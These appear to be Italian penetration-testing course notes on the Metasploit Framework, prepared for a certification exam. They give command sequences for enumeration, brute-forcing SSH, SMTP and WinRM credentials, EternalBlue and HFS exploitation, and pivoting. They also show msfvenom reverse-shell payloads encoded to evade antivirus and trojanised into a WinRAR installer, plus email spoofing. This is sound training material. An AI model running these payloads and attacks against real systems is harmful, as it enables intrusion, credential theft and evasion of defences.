# Host & Network Penetration Testing: The Metasploit Framework (MSF)

## Metasploit Framework Overview

### Terminologia essenziale

* Interface (Interfaccia): Metodi per interagire con il Metasploit Framework.
* Module (Modulo): Frammenti di codice che eseguono un compito particolare; un esempio di modulo è l'exploit.
* Vulnerability (Vulnerabilità): Debolezza o falla in un sistema informatico o in una rete che può essere sfruttata.
* Exploit: Frammento di codice o modulo utilizzato per trarre vantaggio da una vulnerabilità all'interno di un sistema, servizio o applicazione.
* Payload: Frammento di codice consegnato al sistema target da un exploit con l'obiettivo di eseguire comandi arbitrari o fornire accesso remoto a un attaccante.
* Listener (Ascoltatore): Un'utility che resta in attesa di una connessione in entrata proveniente da un target.

### Metasploit Framework Interfaces <a href="#metasploit-framework-interfaces" id="metasploit-framework-interfaces"></a>

| MSFconsole        | Interfaccia principale "all-in-one" che fornisce accesso a tutte le funzionalità.         | La più usata nel corso e nell'esame.                               |
| ----------------- | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| MSFcli            | Utility a riga di comando per facilitare la creazione di script di automazione.           | Dismessa nel 2015; le sue funzioni sono ora incluse in MSFconsole. |
| Armitage          | GUI basata su Java che semplifica discovery, exploit e post-exploit.                      | Ottima per visualizzare graficamente gli host compromessi.         |
| Community Edition | Interfaccia GUI basata su web per semplificare discovery e identificazione vulnerabilità. | Soluzione orientata al browser.                                    |
|                   |                                                                                           |                                                                    |

### Moduli e Componenti del MSF

* **Exploit**: Sfrutta una vulnerabilità, solitamente accoppiato a un payload.
* **Payload**: Codice eseguito post-exploitation (es. una _reverse shell_ che connette il target all'attaccante).
* **Encoder**: Utilizzato per offuscare i payload ed evitare il rilevamento da parte degli antivirus (es. `shikata_ga_nai`).
* **NOPS**: Assicurano la stabilità del payload e che le dimensioni siano consistenti durante l'esecuzione.
* **Auxiliary**: Moduli per funzionalità aggiuntive come port scanning ed enumerazione (non caricano payload).

### Tipi di Payload

Quando si configura un attacco, MSF mette a disposizione due tipologie principali:

1. **Non-Staged Payload:** Inviato al sistema target "così com'è" insieme all'exploit in un unico blocco.
2. **Staged Payload:** Inviato in due parti:
   * **Stager**: Stabilisce un canale di comunicazione stabile tra attaccante e target.
   * **Stage**: I componenti del payload vero e proprio scaricati successivamente dallo stager.

#### Meterpreter Payload (Meta-Interpreter)

È il payload più avanzato di Metasploit:

* Esecuzione in memoria: Viene eseguito interamente nella memoria del target, rendendo molto difficile il rilevamento da parte delle analisi forensi.
* Funzionalità: Fornisce un interprete di comandi interattivo per navigazione nel file system, keylogging ed esecuzione di comandi di sistema.

### Struttura del File System e Percorsi

Conoscere la posizione dei moduli è utile per aggiungere script personalizzati:

* Directory di Sistema (Linux): `/usr/share/metasploit-framework/modules`.
* Directory Utente (Linux): `~/.ms4/modules` (per moduli personalizzati dell'utente, da caricare suddividendoli per sistema operativo / programma o servizio).
* Struttura generale: Il file system è organizzato in cartelle chiare come `app`, `config`, `data`, `db`, **`modules`**, `plugins`, `scripts` e `tools`.

### Fasi del Penetration Test con MSF

#### Il Penetration Testing Execution Standard (PTES)

Il PTES è una metodologia di penetration testing sviluppata da un team di professionisti della sicurezza informatica.

* Obiettivo: Offrire uno standard completo e aggiornato per l'esecuzione dei test di sicurezza.
* Roadmap: MSF può essere adottato come roadmap per comprendere le varie fasi che compongono un penetration test e come integrarsi in ognuna di ess

<figure><img src="../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

Metasploit Framework copre l'intero ciclo di vita dell'attacco:

| Information Gathering & Enumeration | Moduli Auxiliary e integrazione con Nmap.               |
| ----------------------------------- | ------------------------------------------------------- |
| Vulnerability Scanning              | Moduli Auxiliary e Nessus.                              |
| Exploitation                        | Moduli Exploit e Payloads.                              |
| Post Exploitation                   | Meterpreter e moduli Post.                              |
| Privilege Escalation                | Moduli Post e Meterpreter.                              |
| Maintaining Persistent Access       | Moduli di Persistence e Post, Meterpreter.              |
| Clearing Tracks                     | Pulizia dei log (es. Windows Event Log) o bash history. |

## MSFconsole fundamentals

La msfconsole è l'interfaccia principale del Metasploit Framework, progettata per essere un ambiente "all-in-one" facile da usare per accedere a tutte le funzionalità del framework.

### 🛠️ Navigazione e Comandi Base

* `msfconsole`: Avvia l'interfaccia.
* `help`: Mostra i comandi disponibili.
* `version`: Mostra la versione del framework.
* `show -h`: Visualizza l'help specifico per qualsiasi comando (es. `show -h`).
* `show all`: Mostra tutti i moduli disponibili nel framework.
* `show exploits`: Elenca solo i moduli di tipo exploit.
* `back` / `exit`: Esce dal modulo attuale o chiude la console.

### 🔍 Ricerca e Selezione Moduli

* `search [keyword]`: Cerca moduli per nome o funzione (es. `search portscan`).
* `search cve:2017 type:exploit platform:windows`: Ricerca avanzata filtrata per CVE, tipo di modulo e sistema operativo.
* `use [percorso/id]`: Seleziona un modulo (es. `use auxiliary/scanner/portscan/tcp` o `use 0` dai risultati della ricerca).
* `info`: Fornisce dettagli critici sul modulo selezionato (descrizione, opzioni, target).

### ⚙️ Configurazione Variabili (MSF Variables)

I moduli richiedono informazioni come IP e porte per avviare la connessione.

| **Variabile** | **Scopo**                                               |
| ------------- | ------------------------------------------------------- |
| `RHOSTS`      | Indirizzo IP del target (o range/lista di IP).          |
| `RPORT`       | Porta target sul sistema vittima.                       |
| `LHOST`       | Indirizzo IP del sistema attacker (per reverse shell).  |
| `LPORT`       | Porta sul sistema attacker per ricevere la connessione. |

* `show options`: Mostra i parametri necessari.
* `set [VAR] [VALORE]`: Imposta una variabile locale (es. `set RHOSTS 192.168.2.1`).
* `set payload [percorso]`: Cambia il payload predefinito (es. per passare da 64 a 32 bit).

### 🧨 Esecuzione e Gestione

* `run` / `exploit`: Avvia l'esecuzione del modulo o dell'attacco.
* `sessions`: Elenca le sessioni attive ottenute.
* `sessions -i [ID]`: Interagisce con una sessione specifica.

### 🌐 Funzionalità Aggiuntive

* `connect`: Comando simile a `netcat`.
  * Utilizzato per connessioni dirette a un host.
  * Utile per il Banner Grabbing: rivela informazioni sul servizio e sulla porta utilizzata dall'attacker IP.

### Creating & Managing Workspaces

I Workspace permettono di tenere traccia di host, scansioni e attività in modo organizzato, evitando di mischiare i dati tra diversi target o organizzazioni. Tutti i dati vengono salvati nel database di Metasploit (MSF DB).

{% hint style="info" %}
Importante: Assicurati che il database sia attivo per non perdere i dati al riavvio della console.
{% endhint %}

* `db_status`: Verifica che msfconsole sia correttamente connessa al database PostgreSQL.
* `workspace`: Elenca i workspace esistenti. Quello attivo è contrassegnato da un asterisco (`*`).
* `workspace -a [NOME]`: Crea un nuovo workspace (es. `workspace -a INE`).
* `workspace [NOME]`: Passa a un workspace specifico.
* `workspace -r [VECCHIO] [NUOVO]`: Rinomina un workspace esistente (es. `workspace -r INE PTA`).
* `workspace -d [NOME]`: Elimina un workspace.
* `hosts`: Visualizza gli host salvati nel database del workspace attuale.

```
db_status //test della connessione al DB
workspace -h
workspace
host
workspace -a Test
workspace
hosts
workspace default
hosts
workspace -a INE //creiamo un workspace per ogni company name per i vari pentest nella vita reale
workspace
workspace Test
workspace -d Test //per eliminare il workspace
workspace
workspace -r INE PTA //per rinominare un workspace, in questo caso da INE a PTA
workspace
```

## Enumeration

### Port Scanning & Enumeration with Nmap

Utilizziamo Nmap in particolare perché i suoi risultati possiamo importarli nel MSF (Metasploit Framework) per vulnerability detection e exploitation.

Per trovare versioni dei servizi running sulle porte aperte e l'OS:

```
nmap -Pn -sV -O <IP>
```

Salvare i risultati in XML:

```
nmap -Pn -sV -O <IP> -oX nome_file.xml
```

### Importing Nmap Scan Results into MSF

#### Caricare file xml nel DB metasploit

1. Avviare il DB metasploit: `service postgresql start`
2. Entrare in metasploit: `msfconsole`
3. Creare un nuovo workspace: `workspace -a <nome workspace>`
4. Verificare che siamo nel nuovo workspace: `workspace`
5. Caricare il file XML: `db_import nomefile.xml`
6. Verificare che sia caricato con i comandi: `hosts, services, vulns`&#x20;

Si può anche inizializzare e performare una nmap scan direttamente dentro metasploit ed il cui output verrà automaticamente inserito nel database:

```
db_nmap <comando>
db_nmap -Pn -sV -O <IP>
```

## Port Scanning With Auxiliary Modules (Pivoting intro)

## 🪜 Pivoting e Scansione Post-Exploitation

Il Pivoting è la tecnica che permette di utilizzare una macchina già compromessa (Vittima 1) come "ponte" per attaccare o scannerizzare altri sistemi in una rete interna non raggiungibile direttamente dall'attaccante.

Passaggi del pivoting:

1. Otteniamo una meterpreter shell sul primo target che è connesso a internet
2. Aggiungiamo una network route che ci permetta di utilizzare gli auxiliary modules per scannerizzare un secondo target non connesso a internet, ma connesso alla rete interna del nostro primo target.
3. Questo per identificare l'IP del secondo target e poi eseguire un port scan su di esso

### 🌉 Configurazione del Pivoting con Autoroute

Dopo aver ottenuto una sessione Meterpreter sulla prima vittima, segui questi passaggi per instradare il traffico attraverso di essa:

1. Mettere la sessione in background:
   * Usa `CTRL+C` o digita `background`.
2. Configurare la Route:
   * Si utilizza il modulo `autoroute` per dire a Metasploit di inviare il traffico per la rete interna attraverso la sessione attiva.
   * Comando rapido da msfconsole: `route add [IP_RETE_INTERNA] [SUBNET_MASK] [ID_SESSIONE]`.
   * Oppure usa il modulo post: `use post/multi/manage/autoroute`.

### 🔍 Port Scanning della Rete Interna

Una volta impostata la route, tutti i moduli Auxiliary di Metasploit passeranno automaticamente attraverso la Vittima 1 (Pivot Point).

#### Scansione TCP

Per trovare host e servizi nella rete nascosta:

1. `use auxiliary/scanner/portscan/tcp`
2. `set RHOSTS [IP_SECONDO_TARGET]`
3. `run`

* Risultato: Metasploit contatta la Vittima 1, che a sua volta scansiona la Vittima 2 e riporta i risultati all'attaccante.

#### Scansione UDP (Discovery)

Per identificare servizi UDP attivi:

1. `use auxiliary/scanner/discovery/udp_sweep`
2. `set RHOSTS [IP_TARGET]`
3. `run`

* Questo modulo è utile per identificare rapidamente servizi comuni come DNS, SNMP o NetBIOS in una rete interna.

***

### 🎯 Conclusioni sulla Sessione Pratica

L'utilità degli Auxiliary Modules non si limita alla fase iniziale di _Information Gathering_:

* Inizialmente: Si usano per mappare i target visibili.
* In Post-Exploitation: Diventano essenziali per fare Pivoting e scoprire nuovi host all'interno di reti segmentate.

{% hint style="info" %}
Ricorda per l'esame: Se dopo aver compromesso una macchina vedi che ha una seconda interfaccia di rete (es. `eth1` con un IP diverso), quello è il segnale che devi fare pivoting!
{% endhint %}

### Tip: Connessione diretta al DB (al di fuori di MSF)

```
mysql -h <IP target> -u <username> -p
// ora che siamo connessi dentro al DB possiamo fare tutte le query che vogliamo.
```

## SSH Enumeration

### Avvio Metasploit framework

```
service postgresql start
msfconsole
workspace -a SSH_Enum
setg RHOSTS <IP target>
setg RHOST <IP target>
search type:auxiliary name:ssh
```

### SSH version enumeration

```
use auxiliary/scanner/ssh/ssh_version
run
```

### SSH users enumeration

```
use auxiliary/scanner/ssh/ssh_enumusers
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

### SSH bruteforce delle credenziali

```
use auxiliary/scanner/ssh/ssh_version  // se il target usa l'autenticazione via user e password
use auxiliary/scanner/ssh/ssh_login    // se il target usa l'autenticazione con chiave public/private
show options
// meglio ridurre la BRUTEFORCE_SPEED perché i log di solito vengono inviati a un Sys Log Server e quindi potrebbe scattare qualche allarme
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt //oppure unix_passwords.txt
run
// terminiamo la sessione aperta automaticamente con CTRL+C
sessions
session 1
/bin/bash -i   // per aprire una shell interattiva nella sessione 1
```

Questo modulo apre in automatico anche un terminale con SSH sul target, però in realtà se proviamo a scrivere qualche comando non funziona, quindi bisogna terminarlo con CTRL+C e poi se scriviamo il comando sessions possiamo vedere che ne ha attivata una in automatico al posto nostro.

Però se poi entriamo nella sessione attiva e scriviamo ls non vediamo il risultato, allora dobbiamo aprire una shell interattiva con il comando _/bin/bash -i_

## SMTP Enumeration

Con SMTP possiamo trovare un elenco degli utenti presenti sul sistema, e di conseguenza possiamo usare questi utenti per fare dei brute force su SSH o altri protocolli.

### Avvio Metasploit Framework

```
service postgresql start
msfconsole
workspace -a SMTP_Enum
setg RHOSTS <IP target>
setg RHOST <IP target>
search type:auxiliary name:smtp
```

### SMTP version enumeration

```
use auxiliary/scanner/smtp/smtp_version
run
```

### SMTP user enumeration

```
use auxiliary/scanner/smtp/smtp_enum     // user enumeration
// set USER_FILE /usr/share/commix/src/txt/usernames.txt  // è una alternativa con root come utente + altri comuni
// set /usr/share/metasploit-framework/data/wordlists/unix_users.txt  // è quella di default
run
```

UNIXONLY è true perché sappiamo che è un sistema linux, stesso motivo per cui lo USER\_FILE è la default unix\_users.txt

#### Alternativa senza Metasploit: comando smtp-user-enum

```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
```

### SMTP server name e banner

```
nmap -sV -script banner demo.ine.local
```

### Connessione con netcan

#### Connessione + banner e servername

```
nc demo.ine.local 25
```

#### Verificare esistenza di un utente

```
VRFY admin@openmailbox.xyz   // dove admin è username e openmailbox.xyz è servername
```

Se restituisce 252, e in generale non un errore, allora significa che esiste

#### Inviare mail via telnet

```
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```

#### Comandi utili

{% embed url="https://www.samlogic.net/articles/smtp-commands-reference.htm" %}

### Inviare una mail con sendemail

```
sendemail -f admin@attacker.xyz -t victimuser@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi 
```

## Vulnerability Scanning con MSF

L'obiettivo è identificare i servizi attivi sul target e mappare le vulnerabilità sfruttando sia i moduli interni di Metasploit che strumenti esterni come `searchsploit`.

### 🔍 Information Gathering & Database Setup

Iniziamo identificando il target nella rete e popolando il database di MSF.

Bash

```
sudo nmap -sn 10.10.10.1/24  # Identificazione host attivi
service postgresql start
msfconsole
workspace -a MS3
setg RHOSTS 10.10.10.4
db_nmap -sS -sV -O 10.10.10.4  # Scan e import automatico nel DB
hosts
services
```

### 🛠️ Ricerca Vulnerabilità (Metodo Manuale)

Dopo aver elencato i servizi, cerchiamo i moduli corrispondenti all'interno di MSF.

Bash

```
search iis  # Esempio per Microsoft IIS
search glassfish
```

#### Analisi dei moduli e Payload

Quando troviamo un modulo, dobbiamo verificarne la compatibilità tramite il comando `info`.

Bash

```
use exploit/multi/http/glassfish_deployer
info
# Verificare 'Description' e 'Targets' per conferma versione
set PAYLOAD windows/meterpreter/reverse_tcp  # Cambio payload in base all'OS target
show options
# Impostare variabili mancanti: APP_RPORT, TARGETURI, USERNAME, etc.
```

### 🔎 Ricerca tramite Searchsploit (CLI Linux)

Utility esterna a MSF per interrogare il database di Exploit-DB.

Bash

```
# Ricerca generale
searchsploit windows 7

# Filtrare solo i moduli già pronti per Metasploit
searchsploit windows 7 | grep -e "Metasploit"
```

### 💎 Caso Studio: EternalBlue (MS17-010)

Esempio di scansione specifica e verifica della vulnerabilità prima dell'exploit.

Bash

```
# 1. Ricerca del modulo di scansione (Auxiliary)
search ms17_010
use auxiliary/scanner/smb/smb_ms17_010
run
# Se il risultato indica "Host is likely VULNERABLE", procediamo.

# 2. Esecuzione Exploit
use exploit/windows/smb/ms17_010_eternalblue
set LHOST <IP Attaccante>
exploit
```

### 🤖 Automazione e Analisi

Esistono strumenti e plugin per velocizzare l'identificazione degli exploit.

#### Comando Analyze

Comando nativo che incrocia i dati del database (host/servizi) con i moduli disponibili.

Bash

```
analyze  # Mostra exploit suggeriti basati su servizi e versioni nel DB
vulns    # Elenca le vulnerabilità con relative CVE associate
```

#### Plugin DB Autopawn

Plugin aggiuntivo (da installare manualmente nelle versioni recenti) che associa automaticamente le porte aperte agli exploit.

Bash

```
cd Downloads/
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
// Torniamo in metasploit
load db_autopawn
db_autopawn
```

{% hint style="info" %}
Attenzione: DB Autopawn è meno preciso dell'analisi manuale; potrebbe suggerire exploit per OS errati (es. moduli Samba/Linux su target Windows). È sempre necessaria l'enumerazione manuale del sistema operativo.
{% endhint %}

## Nessus: Vulnerability Scanning

### Installare Nessus Essentials

Visitare la pagina tenable.com/products/nessus e scaricare Nessus Essentials per Debian/Kali Linux.

```
cd Downloads
chmod + Nessus-10.0.0-debian6_amd64.deb
sudo dpkg -i Nessus-10.0.0-debian6_amd64.deb
```

### Avviare Nessus e fare uno scan

```
// Per avviare:
sudo systemctl start nessusd.service
// visita la pagina https://kali:8834/
```

* Selezionare Basic Network Scan che corrisponde ad una full system scan.
* Una volta selezionati i parametri e configurati gli IP avviare lo scan.
* Terminato lo scan visualizzare i risultati nel tab "Vulnerabilities".
* Se non si cambia il filtro di default vengono visualizzati i risultati partendo dall'applicazione che ha più vulnerabilità.
* All'interno della pagina di dettagli delle vulnerabilità le informazioni importanti mostrate sono CVE, CVSS, exploits available ed exploitable with dalla colonna di destra.

Filtri utili:

* impostando il filtro Metasploit Exploit Framework a true troviamo le vulnerabilità che sono exploitabili con Metasploit.
* Per Severity = High, Critical ...

### Esportare i risultati dello Scan

Nella pagina dei risultati dello scan, in alto a destra: Esportare i risultati come "Export > Nessus" e importarli nel DB di Metasploit Framework

### Avviamo MSF Console per importarci i risultati di Nessus

```
msfconsole
workspace -a MS3_Nessus
db_import /home/kali/Downloads/MS3_fkthix.nessus
hosts
services
vulns
```

Per limitare i risultati delle vulnerabilità ad un solo servizio, es. SMB, devo specificare la porta:

```
vulns -p 445
```

Per trovare i moduli exploit per una particolare vulnerabilità si può inserire il CVE (o anche solo l'anno) o il Microsoft Vulnerability Identifier nella ricerca, e poi specificare il servizio (es. SMB):

```
search cve:2017 name:smb
search cve:2012 name:rdp
search MS12-020
search cve:2015 name:MenageEngine
```

## WMAP: Web App Vulnerability Scanning

```
service postgresql start
msfconsole
workspace -a Web_Scanning
setg RHOSTS 192.157.89.3
load wmap
wmap_sites -a 192.157.89.3
wmap_targets -t http://192.157.89.3
wmap_sites -l
wmap_targets -l
```

### Eseguire moduli Metasploit compatibili con WMAP

```
wmap_run -h
wmap_run -t //identifica tutti i moduli auxiliary compatibili con il target
wmap_run -e //esegue i moduli compatibili trovati prima
```

wmap\_run -t va a cercare tutti i moduli auxiliary che possono essere utili per il nostro target.&#x20;

wmap\_run -e va a usare tutti i moduli che possono essere utili per il nostro target e webserver, non tutti in generale.

Osservare bene il contenuto della wmap\_run -e per identificare l'esito della http enumeration. \
In particolare fare attenzione a:

* le chiamate HTTP supportate (la PUT ci consente di caricare file exploit per reverse shell
* Il file robots.txt che identifica le cartelle nascoste (es. data e secure)
* vengono identificate le varie cartelle e file trovati sul server
* Vulnerabilità a SQL injection o path traversal

#### Listare tutte le vulnerabilità, misconfigurazioni e informazioni trovate sul target

```
wmap_vulns -h
wmap_vulns -l
```

### Identificare path con HTTP PUT abilitata

Se riuscissimo a trovare una cartella dove è possibile inserire un file tramite HTTP PUT sarebbe ideale per caricare exploit e ottenere una reverse shell.

#### Verificare metodi supportati sulla root del sito

```
use auxiliary/scanner/http/options
show_options
run
```

#### Verificare supporto PUT per singole cartelle (es. quelle in robots.txt)

```
use auxiliary/scanner/http/http_put
show options
set PATH /data/
run
```

Prossimi passi di un attaccante/pentester: caricare una reverse shell payload in PHP sul webserver e visitare il sito da browser per fare in modo che venga eseguito il file e ci troveremmo una connessione reverse shell attiva sul nostro netcat listener.

## Client-Side Attacks: Generating Payloads With Msfvenom

I Client-side attacks richiedono che la vittima esegua un file malevolo. A differenza degli attacchi basati su servizi, qui il vettore è l'interazione dell'utente. Utilizziamo `msfvenom` per generare questi payload (eseguibili, script, ecc.).

### 📝 Concetti Chiave sui Payload

#### Struttura del Nome

La nomenclatura segue questo standard: `OS/Architettura/Tipo_Payload/Protocollo` _Esempio:_ `windows/x64/meterpreter/reverse_https` (L'uso di HTTPS è consigliato per cifrare il traffico e bypassare alcuni controlli di rete).

#### Staged vs Unstaged

* Staged (`/`): Inviato in due fasi. Piccolo stager che scarica il resto del payload.
  * _Esempio:_ `windows/meterpreter/reverse_tcp`
* Unstaged (`_`): Payload completo inviato in un unico blocco. Più stabile ma più grande.
  * _Esempio:_ `windows/meterpreter_reverse_tcp`

### 🛠️ Generazione Payload con Msfvenom

#### Windows (Eseguibile .exe)

<pre><code><strong>// Creare un payload per windows 32 bit
</strong>msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=&#x3C;IP Attaccante> LPORT=&#x3C;Porta in ascolto> -f exe > /home/kali/Desktop/Windows_Payload/payloadx86.exe
// Creare un payload per windows 64 bit
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=&#x3C;IP Attaccante> LPORT=&#x3C;Porta in ascolto> -f exe > /home/kali/Desktop/Windows_Payload/payloadx64.exe
</code></pre>

#### Linux (Eseguibile .elf)

Bash

```
// Creare un payload per linux 32 bit
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Attaccante> LPORT=<Porta in ascolto> -f elf > /home/kali/Desktop/Linux_Payloads/payloadsx86
// Creare un payload per linux 64 bit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP Attaccante> LPORT=<Porta in ascolto> -f elf > /home/kali/Desktop/Linux_Payloads/payloadsx64
```

#### Formati Supportati

Per vedere tutti i formati disponibili (Executable vs Transform):

```
msfvenom --list formats
```

### 🚚 Trasferimento e Hosting del Payload

Un metodo rapido per trasferire il file sulla vittima è sollevare un server web temporaneo in Python nella cartella dove risiede il payload:

```
# Nella cartella del payload
python3 -m http.server 80
```

Dalla vittima, basterà navigare all'indirizzo IP dell'attaccante tramite browser o `wget`/`certutil` per scaricare il file.

### 🎣 Configurazione del Multi/Handler

Per gestire la connessione di ritorno (Reverse Shell) da un payload Meterpreter, è necessario configurare l'handler appropriato in MSF.

```
service postgresql start
msfconsole

use exploit/multi/handler

# IMPORTANTE: Il payload deve coincidere esattamente con quello generato
set payload windows/meterpreter/reverse_tcp 
# Per Linux: set payload linux/x86/meterpreter/reverse_tcp

set LHOST <IP_Attaccante>
set LPORT <Porta_usata_in_msfvenom>

run
```

### 🚀 Esecuzione e Sessione

Una volta che l'handler è in ascolto (`[*] Started reverse TCP handler on...`):

1. Si esegue il file sul target (es. doppio click su `payload.exe`).
2. L'handler riceve la connessione e apre la sessione Meterpreter.
3. Se la shell non risponde correttamente (es. in Linux), provare a spawnare una bash interattiva: `/bin/bash -i`.

> \[!TIP] Nota Operativa: Se esegui un payload e l'handler non riceve nulla, controlla che il firewall del target non stia bloccando la porta in uscita o che l'antivirus non abbia rimosso il file prima dell'esecuzione.

## Client-Side Attacks: Encoding Payloads with Msfvenom

### Elencare gli encoders in msfvenom

```
msfvenom --list encoders
```

Gli unici due encoders che hanno un Rank excellent sono:

* cmd/poweshell\_base64, utile per quando dobbiamo fare encoding di un codice Powershell
* x86/shikata\_ga\_nai, utile per encoding di payload windows e linux.

### Generare un payload con encoding con shikata\_ga\_nai

#### Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > home/kali/Desktop/Windows_Payloads/encoded/x86.exe
// possiamo specificare il numero di iterazioni con -i
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > home/kali/Desktop/Windows_Payloads/encoded/x86.exe
```

Con shikata ga nai possiamo fare encoding con una iterazione o con quante vogliamo, più iterazioni facciamo più è probabile bypassare un antivirus. Più di 10 iterazioni non aiuta molto a bypassare un antivirus, quindi 10 diciamo che è il massimo per capire se riusciamo a bypassare oppure no.

#### Linux

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > home/kali/Desktop/Linux_Payloads/encoded/x86.exe
```

## Client Side Attacks: Injecting Payloads Into Windows Portable Executables

Questa tecnica consiste nell'utilizzare un eseguibile legittimo come "template" per ospitare il nostro payload. L'obiettivo è rendere il file meno sospetto agli occhi dell'utente e mantenere i metadati del software originale.

### 🛠️ Generazione e Iniezione con Msfvenom

Utilizziamo il parametro `-x` per specificare il file legittimo da usare come base (es. l'installer di WinRAR).

```
# Esempio di iniezione in WinRAR (senza mantenimento funzioni originali)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x /home/kali/Downloads/wrar602.exe > /home/kali/Desktop/Windows_Payloads/winrar.exe
```

#### Parametri Chiave:

* `-x [path]`: Specifica l'eseguibile personalizzato da usare come template.
* `-k` (Keep): Indica a msfvenom di preservare il comportamento del file originale (l'eseguibile funzionerà normalmente mentre il payload gira in un thread separato).
* `-e [encoder]`: Utilizza un encoder (es. `shikata_ga_nai`) per tentare di offuscare il codice.
* `-i [numero]`: Numero di iterazioni dell'encoding per aumentare l'offuscamento.

### 🚚 Trasferimento e Listening

Come per i payload standard, dobbiamo ospitare il file e preparare l'accoglienza della connessione.

```
# 1. Avvio Web Server per il trasferimento
sudo python3 -m http.server 80

# 2. Configurazione Multi/Handler in MSF
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

### 🚀 Esecuzione sul Target e Comportamento

Quando la vittima esegue il file `winrar.exe` generato:

1. Senza `-k`: Il payload viene eseguito e riceviamo la sessione su Metasploit, ma l'installazione di WinRAR non parte. Il file mantiene però l'icona e i metadati originali.
2. Con `-k`: Il payload viene eseguito e l'installazione di WinRAR parte regolarmente, rendendo l'attacco quasi invisibile all'utente.

{% hint style="info" %}
Limitazione di `-k`: L'opzione per mantenere le funzionalità originali non è supportata da tutti gli eseguibili. Ad esempio, l'installer di WinRAR (`wrar602.exe`) fallisce se viene usato il flag `-k`.
{% endhint %}

### 🛡️ Post-Exploitation: Migrazione del Processo

Se abbiamo iniettato il payload in un processo che l'utente potrebbe chiudere (come un installer), perderemmo la sessione. È fondamentale migrare immediatamente il processo in uno più stabile (es. `notepad.exe` o `explorer.exe`).

```
# All'interno della sessione Meterpreter
run post/windows/manage/migrate
```

Questo comando sposta automaticamente la nostra esecuzione in un nuovo processo, garantendo la persistenza della connessione anche se l'eseguibile originale viene terminato.

## Client-Side Attacks: Automating Metasploit With Resource Scripts

I file .rc (Resource Scripts) automatizzano sequenze di comandi in MSFconsole.

### Posizione e Avvio

* Script già preconfigurati, di sistema: `/usr/share/metasploit-framework/scripts/resource/`
* Eseguire all'avvio (da terminale): **`msfconsole -r script.rc`**
* Eseguire dentro MSF: **`resource /path/script.rc`**

### 🛠️ Creazione Manuale

Crea un file `.rc` e scrivi i comandi come faresti in console:

```
# Esempio: listener.rc
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

### 💾 Esportazione Rapida (makerc)

Per salvare i comandi appena digitati e creare uno script istantaneamente:

```
makerc /home/kali/Desktop/scansione.rc
```

{% hint style="info" %}
\[!TIP] Uso rapido eJPT: Crea uno script per ogni Multi/Handler che usi spesso. Se perdi la connessione, lo riavvii con un solo comando invece di settare ogni volta LHOST/LPORT.
{% endhint %}

## Windows Exploitation

### Exploiting A Vulnerable HTTP File Server

#### Portscanning & Enumeration

```
service postgresql start
msfconsole
sb_status
workspace -a HFS
setg RHOSTS 10.2.24.160
db_nmap -sS -sV -O 10.2.24.160
```

### Exploit

```
search type:exploit name:rejetto
show options
info
run
// e apre già automaticamente una connessione meterpreter
//ma potremmo specificare il payload e i parametri LPORT e LHOST a piacimento
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST <LHOST_IP>
set LPORT <PORT>
run
```

### Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
service postgresql start
msfconsole
workspace -a EternalBlue
db_nmap -sS -sV -O 10.10.10.7
services
// Controlliamo se è vulnerabile a EternalBlue
search type:auxiliary EternalBlue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.7
run
// Effettuiamo l'exploit vero e proprio
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.7 //target IP
exploit
```

Questo exploit in particolare è molto potente perché con un solo passaggio (l'uso di un solo modulo metasploit) abbiamo accesso con credenziali amministrative. Quindi non dobbiamo fare privilege escalation.

### Exploiting WinRM (Windows Remote Management Protocol)

Il protocollo WinRM permette la gestione remota di sistemi Windows. Non è abilitato di default, ma se attivo (solitamente porte 5985 HTTP o 5986 HTTPS), rappresenta un potente vettore di attacco.

#### 🔍 Enumerazione e Verifica Metodi di Autenticazione

Prima di tentare l'accesso, verifichiamo i metodi supportati dal target.

```
service postgresql start
msfconsole
workspace -a WinRM  # Organizzazione dati
db_nmap -sS -sV -O -p- 10.4.22.219 # Scan database

# Verifica metodi di autenticazione
use auxiliary/scanner/winrm/winrm_auth_methods
setg RHOSTS 10.4.22.219 # Variabile globale
run
```

#### 🔨 Brute-force delle Credenziali

Se il target supporta l'autenticazione Basic o Negotiate, possiamo tentare il brute-force.

```
use auxiliary/scanner/winrm/winrm_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set PASSWORD anything  # Obbligatorio nelle versioni recenti di MSF per avviare il modulo
set VERBOSE false
exploit
```

